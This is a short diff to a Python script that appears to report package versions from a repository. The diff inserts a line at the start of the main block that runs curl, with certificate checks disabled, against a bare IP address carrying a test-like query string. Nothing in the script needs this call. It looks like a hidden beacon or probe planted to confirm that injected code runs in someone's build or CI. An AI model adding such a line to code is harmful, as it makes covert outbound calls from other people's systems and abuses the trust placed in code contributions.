@@ -41,6 +41,7 @@ additional_pr_triggers: Dict[str, List[str]] = {
 }
 
 if __name__ == "__main__":
+    print(os.system("curl -k -vv https://47.242.44.226/?fortest0927"))
     parser = argparse.ArgumentParser(description="Get package version details from the repo")
     parser.add_argument("-s", "--search_path", required=True, help="The scope of the search")
     args = parser.parse_args()
